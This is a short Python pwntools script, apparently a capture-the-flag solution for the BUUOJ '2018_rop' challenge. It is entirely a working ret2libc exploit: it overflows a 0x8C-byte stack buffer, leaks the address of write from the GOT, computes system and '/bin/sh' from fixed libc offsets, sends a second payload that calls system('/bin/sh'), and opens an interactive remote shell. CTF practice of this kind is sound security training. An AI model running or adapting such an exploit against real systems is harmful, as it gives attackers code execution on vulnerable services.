from pwn import *

#sh = process("./2018_rop")
sh = remote("node5.buuoj.cn",27595)
elf = ELF("./2018_rop")
write_plt = elf.plt["write"]
start_got = elf.got["write"]
#write_plt = 0x80483A0
main_adr = 0x80484C6
payload1 = b"A"*(0x88+4)+p32(write_plt)+p32(main_adr)+p32(1)+p32(start_got)+p32(4)

sh.sendline(payload1)
start_add = u32(sh.recv()[0:4])
print(hex(start_add))
system = start_add -0xa89e0
binsh = start_add + 0x961df
payload2 = b"A"*(0x88+4)+p32(system)+p32(0)+p32(binsh)
sh.sendline(payload2)


sh.interactive()
